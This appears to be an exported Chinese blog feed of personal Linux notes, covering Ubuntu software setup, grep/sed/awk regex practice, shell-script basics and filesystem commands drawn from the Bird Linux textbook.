<p><a href="http://itlab.idcquan.com/linux/set/39862.html" target="_blank" rel="external">ChinaItLab</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定路径</span></span><br><span class="line">./configure --prefix=/opt/softwareFloader</span><br><span class="line">make; make install</span><br><span class="line">--- 有两种方法可以快速调用 ---</span><br><span class="line"><span class="comment"># 1.创建软链接</span></span><br><span class="line">ln <span class="_">-s</span> /opt/softwareFloader/bin/software /usr/bin/software</span><br><span class="line"><span class="comment"># 2.添加环境变量,可参照日常更新1</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/opt/softwareFloader/bin</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="theme"><a href="#theme" class="headerlink" title="theme"></a>theme</h3><p>发现了另一个gtk主题<code>Numix</code>, 原来那个是material design的一个主题<code>paper</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:numix/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install numix-gtk-theme numix-icon-theme-cirle</span><br></pre></td></tr></table></figure></p>
<p>paper可以在<code>github</code>上搜到</p>
<h3 id="不错的软件推荐"><a href="#不错的软件推荐" class="headerlink" title="不错的软件推荐"></a>不错的软件推荐</h3><p>==&gt;<a href="http://askubuntu.com/questions/30334/what-application-indicators-are-available" target="_blank" rel="external">AskUbuntu</a>&lt;==<br>在用的两个小插件<br>1.sudo apt-get install indicator-multiload  系统状态监测,柱状图表示<br>2.sudo apt-get install indicator-cpufreq  CPU频率设置(我这个版本只有节能和性能两种功能了,很棒)</p>
<p>==&gt;[tree]-sudo apt install tree<br>目录树</p>
<h3 id="dpkg安装卸载"><a href="#dpkg安装卸载" class="headerlink" title="dpkg安装卸载"></a>dpkg安装卸载</h3><blockquote>
<p><a href="http://www.thegeekstuff.com/2010/06/install-remove-deb-package/" target="_blank" rel="external">thegeekstuff-SASIKALA</a><br>dpkg -i packge  #i install<br>dpkg -r packge  #r remove<br>dpkg -l packge  #l list 配合grep来查询包是否存在<br>Reference:<a href="http://wrchiu.blog.51cto.com/817024/359085" target="_blank" rel="external">51CTO</a></p>
</blockquote>
<h3 id="sublime中文输入"><a href="#sublime中文输入" class="headerlink" title="sublime中文输入"></a>sublime中文输入</h3><p>轮子有大牛写好了<br>——-Ubuntu——-<br>===&gt;<a href="http://blog.csdn.net/cywosp/article/details/32350899" target="_blank" rel="external">csdn-cywosp</a>&lt;===  </p>
<p>虽然这样desktop图标可以用了,其他的方式还是不行,所以用linux的<code>alias</code>功能!</p>
<blockquote>
<p>sudo vi .bashrc</p>
</blockquote>
<p>根据alias编写格式将原来的subl改成以下内容<br>.so文件路径按自己情况更改</p>
<blockquote>
<p>alias subl=’LD_PRELOAD=/usr/lib/libsublime-imfix.so /opt/sublime_text/sublime_text’</p>
</blockquote>
<h3 id="sublime-3103-cpu100"><a href="#sublime-3103-cpu100" class="headerlink" title="sublime 3103 cpu100%"></a>sublime 3103 cpu100%</h3><p>在.config/sublime-text-3/Packages/User/Preferences.sublime-settings 中加入<br><code>&quot;index_files&quot;:false,</code></p>
<h3 id="Theme-material-design"><a href="#Theme-material-design" class="headerlink" title="Theme-material design"></a>Theme-material design</h3><p><a href="http://itsfoss.com/install-paper-theme-linux/" target="_blank" rel="external">itsfoss-ABHISHEK</a></p>
<h2 id="Device-Driver"><a href="#Device-Driver" class="headerlink" title="Device/Driver"></a>Device/Driver</h2><h3 id="U盘格式化"><a href="#U盘格式化" class="headerlink" title="U盘格式化"></a>U盘格式化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. df #查看挂载的U盘</span><br><span class="line">2. umount /dev/sdc1 #我的u盘为/dev/sdc1</span><br><span class="line">3. mkfs -t vfat /dev/sdc1 #格式化好慢...</span><br><span class="line">or mkfs.vfat /dev/sdc1</span><br><span class="line"># -L label 更改卷名字</span><br></pre></td></tr></table></figure>
<h3 id="iso镜像制作"><a href="#iso镜像制作" class="headerlink" title="iso镜像制作"></a>iso镜像制作</h3><ol>
<li><p>查看挂载</p>
<blockquote>
<p>sudo fdisk -l</p>
</blockquote>
</li>
<li><p>切换权限</p>
<blockquote>
<p>sudo -i</p>
</blockquote>
</li>
<li><p>cat重定向</p>
<blockquote>
<p>cat xxx.iso &gt; /dev/sdc1</p>
</blockquote>
</li>
<li><p>弹出U盘,需要等待U盘写入</p>
<blockquote>
<p>sudo eject -s /dev/sdc1</p>
</blockquote>
</li>
</ol>
<p>Preference:<a href="http://blog.csdn.net/longerzone/article/details/12941727" target="_blank" rel="external">CSDN_longerzone</a></p>
<h3 id="关于硬盘"><a href="#关于硬盘" class="headerlink" title="关于硬盘"></a>关于硬盘</h3><ol>
<li>Ubuntu自带:<code>baobab</code></li>
<li>有关分区<blockquote>
<p><a href="http://gparted.sourceforge.net/livecd.php" target="_blank" rel="external">sourceforge</a><br>gparted</p>
</blockquote>
</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记--鸟哥私房菜③]]></title>
      <url>http://csser.work/03/01/2016/book-vbird-3/</url>
      <content type="html"><![CDATA[<h1 id="Shell-Script"><a href="#Shell-Script" class="headerlink" title="Shell Script"></a>Shell Script</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>0x1. 条件<br> 编写的shell.sh需要rx权限<br>0x2. 执行<br>  1.绝对/相对路径<br>  2.export $PATH 直接执行<br>  3.bash shell.sh<br>0x3. 文件规范</p>
<blockquote>
<p>这行用来声明使用bash语法,运行时可加载bash环境<br><code>#!/bin/bash</code></p>
</blockquote>
<h2 id="代码练习放在新库中"><a href="#代码练习放在新库中" class="headerlink" title="代码练习放在新库中"></a>代码练习放在新库中</h2><ul>
<li>sh02.sh<br>Standard input and output.</li>
<li>sh03.sh<br>随日期变化创建具时间的文件名</li>
<li>sh04.sh<br>数值运算<br>declare 定义变量类型<blockquote>
<p>declare -i total=$firstnum*$secondnum</p>
</blockquote>
</li>
</ul>
<p>直接用两个小括号<code>(())</code>brakets来代替<br>这种写法需要记住!</p>
<blockquote>
<p>variable=<code>$(($a*$b))</code></p>
</blockquote>
<h2 id="source-VS-bash"><a href="#source-VS-bash" class="headerlink" title="source VS bash"></a>source VS bash</h2><p>这两者都可以执行脚本,但是bash会创建一个新的bash环境(子进程)供script使用,而source则是直接执行script.<br>script中的变量也就类似于main()函数中的子函数(bash-script)和主函数(source script)中变量的关系了.<br>=&gt;sh02.sh为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"xxx"</span> firstname</span><br></pre></td></tr></table></figure></p>
<p>source sh02.sh 中的firstname在执行完之后依然存在,<br>而bash sh02.sh中的变量就消失了</p>
<p>不注销用<code>source ~/.bashrc</code>改变变量的原因也就是这个了</p>
<h2 id="判断式"><a href="#判断式" class="headerlink" title="判断式"></a>判断式</h2><h3 id="test-option-file-amp-amp-function"><a href="#test-option-file-amp-amp-function" class="headerlink" title="test [option] file &amp;&amp;/|| function"></a>test [option] file &amp;&amp;/|| function</h3><p>sh05.sh 判断文件名是否存在,是目录还是文件,并判断执行者的权限<br>常用[option]:-e 存在性 -f file -d dirctory<br><code>-a</code> all 同时成立 <code>-o</code> optional 一个成立即可  <code>!</code> 反向状态 01互换</p>
<ul>
<li>其他的参数在这=&gt; <a href="http://man.linuxde.net/test" target="_blank" rel="external">test</a><br>man了一下test,发现也没有找到test指定路径或者递归的做法,<br>即test只能判断当前目录下的文件,也不支持通配符一类的东西</li>
</ul>
<h3 id="判断符号"><a href="#判断符号" class="headerlink" title="判断符号[]"></a>判断符号[]</h3><p>中括号[]基本和test用法一样,不过在if then fi中更常用<br><strong>需要注意</strong>:</p>
<ul>
<li>中括号内部每个单位均需要空格<code> </code>隔开</li>
<li>中括号内部组件的变量和常量需要<code>&quot;</code>或者<code>&#39;</code>框起来</li>
</ul>
<p>原因可以用这个解释:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'quentin smith'</span></span><br><span class="line">[ <span class="variable">$name</span> == <span class="string">"quentin"</span> ]</span><br><span class="line"><span class="comment">#错误提示</span></span><br><span class="line">bash: [: 参数太多</span><br></pre></td></tr></table></figure></p>
<p>将name变量用字符串代换就知道错误了</p>
<ul>
<li>sh06.sh<br>判断用户输入并给予不同的结果</li>
</ul>
<h2 id="Shell-Script-默认变量"><a href="#Shell-Script-默认变量" class="headerlink" title="Shell Script 默认变量"></a>Shell Script 默认变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A</span></span><br><span class="line">/path/to/scriptname option1 opt2 opt3 opt4 ...</span><br><span class="line">        <span class="variable">$0</span>             <span class="variable">$1</span>    <span class="variable">$2</span>   <span class="variable">$3</span>   <span class="variable">$4</span></span><br><span class="line"><span class="comment">#B</span></span><br><span class="line"><span class="variable">$#</span> 代表参数个数</span><br><span class="line"><span class="variable">$@</span> 代表内置变量A中的内容</span><br><span class="line">$* 比<span class="string">'#@'</span>用法广,代表<span class="string">"<span class="variable">$1c</span><span class="variable">$2c</span><span class="variable">$3</span>..."</span> c为分隔符</span><br></pre></td></tr></table></figure>
<ul>
<li>sh07.sh<br>创建一个具有可选[option]的shell script</li>
</ul>
<h3 id="shift变量号偏移"><a href="#shift变量号偏移" class="headerlink" title="shift变量号偏移"></a>shift变量号偏移</h3><p>即原来的号码<code>增加shift的数量</code></p>
<ul>
<li>sh08.sh<br>shift演示</li>
</ul>
<h2 id="if-then-fi"><a href="#if-then-fi" class="headerlink" title="if then fi"></a>if then fi</h2><p><strong>后面因为只要有语言基础的都懂,就不具体讲了</strong></p>
<ul>
<li>sh06-2.sh<br><code>这里的&amp;&amp;||和前面基础bash中的&amp;&amp;||不要搞错了,含义不同</code><br>基本格式:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ assertions ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">command</span></span><br><span class="line">  (<span class="keyword">elif</span> [ assertions ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">command</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>+sh10.sh<br>判断本机端口的开放情况<br>下面的是获取主机启动的服务</p>
<blockquote>
<p>netstat -tuln</p>
</blockquote>
<p>获取之后的格式:<br>1.封包格式(tcp udp.etc) 2.收发包 3.本地IP:port 4.远程ip:port 是否监听<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN<br>22的ssh端口表示任意远程ip的任意端口都能连接</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记--鸟哥私房菜②]]></title>
      <url>http://csser.work/02/26/2016/book-vbird-2/</url>
      <content type="html"><![CDATA[<h1 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h1><p>主要以栗子为主</p>
<h2 id="grep-ivn-A-Bn-‘keyword’"><a href="#grep-ivn-A-Bn-‘keyword’" class="headerlink" title="grep [-ivn][-A/Bn] ‘keyword’"></a>grep [-ivn][-A/Bn] ‘keyword’</h2><h3 id="行相关"><a href="#行相关" class="headerlink" title="行相关"></a>行相关</h3><p>0x1 查找内核中有 eth 字样的行数据,显示行号,额外再显示选中行前(befor)3行和后(after)2行的数据</p>
<blockquote>
<p>dmesg | grep -n -B3 -A2 ‘eth’</p>
</blockquote>
<h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询[]"></a>模糊查询<code>[]</code></h3><p>0x1 不区分test和taste单词</p>
<blockquote>
<p>grep -n ‘t[ae]st’ testfile</p>
</blockquote>
<h3 id="反向查找"><a href="#反向查找" class="headerlink" title="反向查找[^]"></a>反向查找<code>[^]</code></h3><p>0x1 找首字母不是元音的单词所在的行号<br>可以自行去找个测试网站尝试(\s过滤无用空格避免错误判断)</p>
<blockquote>
<p>grep -in ‘\b[^aeiou\s][a-z]+\b’ /var/log/kern.log.1</p>
<blockquote>
<p>这里自作聪明用<code>()</code>把[a-z]+给框了起来,然后就识别不出来</p>
</blockquote>
</blockquote>
<p>—-后记: 发现<code>小括号也需要转义</code>!!= =</p>
<h3 id="行-首尾"><a href="#行-首尾" class="headerlink" title="行-首尾^$"></a>行-首尾^$</h3><p>此<code>^</code>区别于上面的<code>^</code>,位置不同<br>0x1 查找二月份的内核日志</p>
<blockquote>
<p>grep -in ‘^Feb’ /var/log/kern.log.1</p>
</blockquote>
<p>0x2 查找以<code>.</code>作为结尾的数据(.本身存在option含义,需要转义)<br>$在linux中是换行结尾符,windows则为<code>^M$</code></p>
<blockquote>
<p>grep -n ‘.$’ /var/log/kern.log.1</p>
</blockquote>
<p>0x3 查找空白行(^$首尾相接)</p>
<blockquote>
<p>grep -n ‘^$’ ./tmp/testfile</p>
</blockquote>
<h3 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配. * +"></a>字符匹配. * +</h3><h4 id="匹配任意一个字符"><a href="#匹配任意一个字符" class="headerlink" title=". 匹配任意一个字符"></a>. 匹配任意一个字符</h4><p>0x1 匹配 l??d </p>
<blockquote>
<p>grep -n ‘l..d’ /var/log/kern.log.1</p>
</blockquote>
<p>该文件可以匹配到called load等单词</p>
<h4 id="匹配0次以上"><a href="#匹配0次以上" class="headerlink" title="* 匹配0次以上"></a>* 匹配0次以上</h4><p>0x2 <code>.*</code>的组合表示匹配任意数量字符</p>
<blockquote>
<p>grep -n ‘e.*e’ /var/log/kern.log.1</p>
</blockquote>
<p>这种情况在两个e之间碰到e不会停下,直到找到最后一个e,形成最长字串</p>
<h4 id="匹配1次以上-需要转义"><a href="#匹配1次以上-需要转义" class="headerlink" title="+ 匹配1次以上 需要转义= ="></a>+ 匹配1次以上 需要转义= =</h4><p>0x3 匹配e/ee/eee/e….</p>
<blockquote>
<p>grep -n ‘e+‘ /var/log/kern.log.1</p>
</blockquote>
<h3 id="连续字符范围限定-m-n-需要转义"><a href="#连续字符范围限定-m-n-需要转义" class="headerlink" title="连续字符范围限定{m,n} 需要转义"></a>连续字符范围限定{m,n} 需要转义</h3><p>m,n可以省略其一<br>0x1 仅匹配一个<code>er</code></p>
<blockquote>
<p>grep -n ‘(er){1}‘ testfile </p>
</blockquote>
<p>0x2 匹配2个以上er</p>
<blockquote>
<p>grep -n ‘(er){2,}‘ testfile</p>
</blockquote>
<p>这里有一种情况:<code>ererer</code>在{2,}的选择下是一个整体,即{}会自动匹配最高重复数 </p>
<h2 id="sed-nefr-action"><a href="#sed-nefr-action" class="headerlink" title="sed [-nefr] action"></a>sed [-nefr] action</h2><p>-n silent模式,只出现被处理的那行<br>-e edit -f 将sed动作写入file<br>-r 扩展型regex -i直接修改文件内容</p>
<h3 id="action-n1-n2-function"><a href="#action-n1-n2-function" class="headerlink" title="action === [n1[,n2]] function"></a>action === [n1[,n2]] function</h3><p>所有动作的最小单位均为<code>行</code><br>function:<br>-a add -c 替换 -d delete<br>-i insert -p print  -s 替换,<code>可用正则</code> 加上标题的行号就可以进行<code>批量替换</code>啦~</p>
<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><h3 id="增-删-替换"><a href="#增-删-替换" class="headerlink" title="增 删 替换"></a>增 删 替换</h3><p>0x1 /etc/passwd删除2-5行并打印(含行号<code>nl</code>)</p>
<blockquote>
<p>nl /etc/passwd | sed ‘2,5d’</p>
</blockquote>
<p>0x2 在3-5行前/后换行新添’next’字符串(参照vim)</p>
<blockquote>
<p>nl /etc/passwd | sed ‘3,5<code>[i/a]</code> next’</p>
</blockquote>
<p>0x3 将1-4行全部替换为’next’</p>
<blockquote>
<p>nl /etc/passwd | sed ‘1,4c next’</p>
</blockquote>
<h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><p>0x1 只显示2-6行内容<br><code>-n</code> 经过处理的</p>
<blockquote>
<p>nl /etc/passwd | sed -n ‘2,6p’</p>
</blockquote>
<h3 id="批量替换"><a href="#批量替换" class="headerlink" title="!批量替换!"></a>!批量替换!</h3><p>语法: <code>s/word1/word2/g&#39; g可选</code>globe`全局概念<br>0x1 在ifconfig中将ip截取出来</p>
<blockquote>
<p>选行-&gt;除首-&gt;除尾<br>ifconfig wlan0 | grep -n ‘192.168’ | sed ‘s/^.<em>ddr://g’ | sed ‘s/\s.</em>.0$//g’</p>
</blockquote>
<h4 id="vim的批量替换"><a href="#vim的批量替换" class="headerlink" title="vim的批量替换"></a>vim的批量替换</h4><p>0x1 当前行替换</p>
<blockquote>
<p>:s/XXX/YYY/g</p>
</blockquote>
<p>0x2 行范围替换</p>
<blockquote>
<p>:100, 102s/XXX/YYY/g </p>
</blockquote>
<p>0x3 全局替换</p>
<blockquote>
<p>%s/XXX/YYY/g</p>
</blockquote>
<h2 id="egrep-expand-grep"><a href="#egrep-expand-grep" class="headerlink" title="egrep(expand grep)"></a>egrep(expand grep)</h2><p>(感觉以后还是直接alias grep=egrep好一点)<br><code>X+</code> 1个或以上X <code>X?</code>0或一个X <code>|</code>或<br><code>()</code> 分组 <code>()+</code> 多个重复组判别<br>小李子:</p>
<blockquote>
<p>cat /etc/passwd | egrep -n “^c|^s”</p>
</blockquote>
<p>(nl居然连grep基本的^都不能用…)</p>
<h1 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h1><h2 id="排版printf"><a href="#排版printf" class="headerlink" title="排版printf"></a>排版<code>printf</code></h2><blockquote>
<p>printf ‘%s\n’ $(nl /etc/passwd)<br>printf ‘\x55\n’</p>
</blockquote>
<h2 id="awk-‘-conditions-actions-’-filename"><a href="#awk-‘-conditions-actions-’-filename" class="headerlink" title="awk ‘[conditions]{actions}’ filename"></a><code>awk</code> ‘[conditions]{actions}’ filename</h2><h3 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h3><p>$0 整行 行内:$1 $2 $3 为第n个连续<br>NF 每行的字段总数 NR:目前处理的行号(row) FS:文件分隔符(split)<br>所有动作需要<code>&quot;&quot;</code>括住<br>运算符<code>==</code>表示等于</p>
<h3 id="对比sed"><a href="#对比sed" class="headerlink" title="对比sed"></a>对比sed</h3><p>相对于sed的行处理,sed主要将数据变为多个字段进行处理</p>
<h3 id="栗子-1"><a href="#栗子-1" class="headerlink" title="栗子"></a>栗子</h3><p>0x1 取出最近3个账号及登陆IP last -i显示ip</p>
<blockquote>
<p>last -in 3<br>a1exlism@dell:~$ last -in 5 | awk ‘{printf $1 “\t” $3”\n”}’</p>
<blockquote>
<p>a1exlism 0.0.0.0<br>a1exlism 0.0.0.0<br>a1exlism 0.0.0.0<br>wtmp  Mon</p>
</blockquote>
</blockquote>
<p>0x2 NR NF实践-列出所处理的行列号</p>
<blockquote>
<p>last -n 5 | awk ‘{printf $1 “\t lines:” NR “\t columns: “ NF”\n”}’</p>
</blockquote>
<p>0x3 awk内部重定向和NS实践-打印以<code>:</code>分割数据后第三<code>大字段</code>中大于5的第二个<code>小字段</code></p>
<blockquote>
<p>cat /etc/passwd | awk ‘{FS “:”} $3 &gt; 5 {printf $2 “\n”}’</p>
</blockquote>
<p>0x4 awk预置变量(保证第一行数据正确地被执行)</p>
<blockquote>
<p>cat /etc/passwd | awk ‘<code>BEGIN</code> {FS “:”} $3 &gt; 5 {printf $2 “\n”}’</p>
</blockquote>
<p>0x5 awk的计算功能<br>计算不写了</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>《鸟哥私房菜》</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记--鸟哥私房菜①]]></title>
      <url>http://csser.work/02/20/2016/book-vbird-1/</url>
      <content type="html"><![CDATA[<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="非纯文本文件查看-od"><a href="#非纯文本文件查看-od" class="headerlink" title="非纯文本文件查看 od"></a>非纯文本文件查看 od</h2><p>od -t [filetype] filename<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1exlism@dell:/var/<span class="built_in">log</span>$ od -t c Xorg.1.log</span><br></pre></td></tr></table></figure></p>
<h2 id="ls按容量-时间查询"><a href="#ls按容量-时间查询" class="headerlink" title="ls按容量,时间查询"></a>ls按容量,时间查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -h <span class="comment">#容量</span></span><br><span class="line">ls --full-time <span class="comment">#完整时间</span></span><br><span class="line">ls --time=[use,atime,ctime] <span class="comment">#分别对应下面的touch三种情况</span></span><br></pre></td></tr></table></figure>
<p>ls -F   #输出文件类型</p>
<h2 id="完全复制"><a href="#完全复制" class="headerlink" title="完全复制"></a>完全复制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="_">-a</span> ./file1 /another/floder/file2</span><br></pre></td></tr></table></figure>
<p>-a == -pdr<br>-p:复制文件属性<br>-d:如果是link file,复制链接文件而不是链接过去的大文件<br>-r:递归复制</p>
<h2 id="touch修改文件时间"><a href="#touch修改文件时间" class="headerlink" title="touch修改文件时间"></a>touch修改文件时间</h2><p>三种时间在以下情况变化:<br>modification time(mtime) 内容被改<br>change time(ctime) 属性或者权限被改变(e.g., 重命名)<br>access time(atime) 被访问</p>
<h2 id="文件隐藏属性attr"><a href="#文件隐藏属性attr" class="headerlink" title="文件隐藏属性attr"></a>文件隐藏属性attr</h2><h3 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h3><p>chattr [+-=] [option]<br>option(常用):<br>a(root):只能增加数据,不能修改和删除<br>d:禁止文件被dump<br>i(root):禁止基本一切操作(增删改查)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i testfile</span><br><span class="line">rm testfile</span><br><span class="line"><span class="comment">#rm：是否删除有写保护的普通空文件 "testfile"？ y</span></span><br><span class="line"><span class="comment">#rm: 无法删除"testfile": 不允许的操作</span></span><br><span class="line">chattr -i testfile</span><br><span class="line">rm testfile</span><br></pre></td></tr></table></figure></p>
<h3 id="lsattr"><a href="#lsattr" class="headerlink" title="lsattr"></a>lsattr</h3><p>和ls差不多用法<br>三个option:<br>-a all<br>-d 忽略目录内文件<br>-R 递归<br>e.g., <code>lsattr -aR</code></p>
<h2 id="Ext2文件系统介绍"><a href="#Ext2文件系统介绍" class="headerlink" title="Ext2文件系统介绍"></a>Ext2文件系统介绍</h2><p>暂时感觉ext2-4这些概念差不多..<br>Ext2文件系统采用的是 <code>Indexed Allocation</code>(索引式文件系统),和数据结构中的结构体指针差不多,windows那种的话应该和U盘的<br>super block: 记录文件系统的整体信息,包括inode/block总量,使用量,剩余量和文件系统的格式和相关信息<br><code>inode: 记录文件属性,一个文件占用一个inode,同时记录该文件数据所在的block号码</code><br>block: 实际记录文件的内容,文件过大会占用多个block<br><code>磁盘的碎片整理</code>==&gt;<a href="http://zxgchinese.blog.51cto.com/2508492/1131456" target="_blank" rel="external">51CTO-明诚阁</a></p>
<h2 id="文件链接-ln"><a href="#文件链接-ln" class="headerlink" title="文件链接: ln"></a>文件链接: ln</h2><p><code>hard link</code>硬链接</p>
<blockquote>
<p>无法<br>1.链接目录<br>2.跨文件系统</p>
</blockquote>
<p>和复制还是有区别的,至少硬链接产生的文件使他们两个文件指向同一个block文件</p>
<p><code>symbolic link</code>符号链接,对应于windows的<code>快捷方式</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">ln <span class="_">-s</span> ~ <span class="built_in">test</span>Folder <span class="comment">#-s symbolic</span></span><br><span class="line">ls <span class="_">-l</span></span><br><span class="line"><span class="comment">#lrwxrwxrwx 1 a1exlism a1exlism   13  2月 14 22:28 testFolder1 -&gt; /home/a1exlism</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>后记<br>ln -s 中的文件目录需要<code>绝对路径</code>,类似于./的相对路径无效</p>
</blockquote>
<h1 id="Device-Driver"><a href="#Device-Driver" class="headerlink" title="Device/Driver"></a>Device/Driver</h1><h2 id="CMD-磁盘"><a href="#CMD-磁盘" class="headerlink" title="CMD-磁盘"></a>CMD-磁盘</h2><p>1.<code>df</code> [option] file/floder<br>df ==&gt;disk and floder<br>-i 以inode显示 -h humanized人性化显示(kb,mb,etc)</p>
<blockquote>
<p>df /</p>
</blockquote>
<p>2.<code>du</code><br>du ==&gt; disk usage 磁盘使用状态<br>-s sum只显示总量</p>
<blockquote>
<p>du ~</p>
</blockquote>
<h2 id="查询文件系统"><a href="#查询文件系统" class="headerlink" title="查询文件系统"></a>查询文件系统</h2><p>dumpe2fs [-bh] 设备文件名<br>-b broken size 显示坏道<br>-h 只显示superblock</p>
<h2 id="磁盘分区fdisk"><a href="#磁盘分区fdisk" class="headerlink" title="磁盘分区fdisk"></a>磁盘分区fdisk</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df <span class="comment">#查看大致文件系统的物理地址</span></span><br><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
<p>之后按m就能解决一切了..不过小心按w(保存)</p>
<h2 id="磁盘格式化mkfs"><a href="#磁盘格式化mkfs" class="headerlink" title="磁盘格式化mkfs"></a>磁盘格式化mkfs</h2><p>make file system</p>
<blockquote>
<p>mkfs [-t 文件系统格式] 设备文件名<br>文件格式:ext4,exFat…</p>
</blockquote>
<p>不细搞了</p>
<h2 id="磁盘检验fsck-badblocks"><a href="#磁盘检验fsck-badblocks" class="headerlink" title="磁盘检验fsck,badblocks"></a>磁盘检验fsck,badblocks</h2><p>file system check</p>
<blockquote>
<p>mkfs [-t 文件系统格式] [option] 设备文件名</p>
</blockquote>
<h2 id="iso镜像loop模式挂载"><a href="#iso镜像loop模式挂载" class="headerlink" title="iso镜像loop模式挂载"></a><code>iso</code>镜像loop模式挂载</h2><p>un/mount需要root权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/mountFloder</span><br><span class="line">mount -o loop /media/a1exlism/Data/ISO/ubuntu-15.04-desktop-amd64.iso </span><br><span class="line">df <span class="comment">#查看一下有没有挂载</span></span><br><span class="line">umount /tmp/mountFloder</span><br></pre></td></tr></table></figure></p>
<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>command记忆功能(注销之后才会被记录):</p>
<blockquote>
<p>vim .bash_history </p>
</blockquote>
<p>分行输入,添加<code>\</code>,enter<br>bash中引用变量:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入当前kernel</span></span><br><span class="line"><span class="built_in">cd</span> /lib/modules/`uname -r`/kernel</span><br><span class="line"><span class="comment">#`表示优先执行</span></span><br><span class="line"><span class="built_in">cd</span> /lib/modules/$(uname -r)/kernel</span><br></pre></td></tr></table></figure></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="内置命令"><a href="#内置命令" class="headerlink" title="内置命令"></a>内置命令</h3><ol>
<li><p>环境变量</p>
<blockquote>
<p>env</p>
</blockquote>
</li>
<li><p>所有变量</p>
<blockquote>
<p>set</p>
</blockquote>
</li>
<li><p>自定义变量转换为环境变量</p>
<blockquote>
<p>export val</p>
</blockquote>
</li>
<li><p>变量声明<br>-a arr  -i integer<br>-x export -r readonly</p>
<blockquote>
<p>declare [-aixr] val</p>
</blockquote>
</li>
<li><p>删除变量/函数<br>-v  variable only -f function only</p>
<blockquote>
<p>unset [-vf] mylove</p>
</blockquote>
</li>
<li><p>用户限制</p>
<blockquote>
<p><a href="http://man.linuxde.net/ulimit" target="_blank" rel="external">ulimit</a><br>ulimit [-SHacdfltu] 配额</p>
</blockquote>
</li>
</ol>
<h3 id="变量内容"><a href="#变量内容" class="headerlink" title="变量内容"></a>变量内容</h3><p><strong>0x1</strong> 删除</p>
<blockquote>
